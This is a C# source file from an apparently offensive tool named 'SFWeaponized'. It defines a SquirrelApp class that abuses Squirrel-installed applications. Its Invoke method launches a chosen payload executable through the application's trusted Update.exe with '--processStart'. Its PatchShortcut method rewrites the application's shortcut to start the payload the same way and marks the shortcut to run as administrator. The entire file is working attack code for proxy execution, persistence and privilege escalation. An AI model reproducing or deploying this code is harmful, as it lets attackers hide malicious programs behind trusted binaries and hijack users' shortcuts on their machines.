using System.IO;

namespace SFWeaponized.Model
{
    public class SquirrelApp
    {
        public string Name { get; set; }
        public string Root { get; set; }
        public string CurrentVersion { get; set; }
        public string ShortcutPath { get; set; }

        public SquirrelApp(string name, string root, string currentVersion) 
        { 
            Name = name;
            Root = root;
            CurrentVersion = currentVersion;
        }

        public void SetShortcutPath() => ShortcutPath = ShortcutUtils.FindShortcut(Root);

        public void Invoke(string payloadExeName)
        {
            string updateFilePath = Path.Combine(Root, "Update.exe");

            if (!File.Exists(updateFilePath))
                return;

            ProcessUtils.Run(updateFilePath, $"--processStart \"{payloadExeName}\" --process-start-args \"{Name}.exe\"");
        }

        public void PatchShortcut(string payloadExeName)
        {
            if (!string.IsNullOrEmpty(ShortcutPath))
            {
                ShortcutUtils.Edit(ShortcutPath, $"--processStart \"{payloadExeName}\" --process-start-args \"{Name}.exe\"", Path.Combine(Root, "Update.exe"));
                ShortcutUtils.SetRunAsAdmin(ShortcutPath);
            }
        }

        public void CreateShortcut()
        {
            string updateFilePath = Path.Combine(Root, "Update.exe");

            if (!File.Exists(updateFilePath))
                return;

            ProcessUtils.Run(updateFilePath, $"--createShortcut={Name}.exe", false);
        }
    }
}
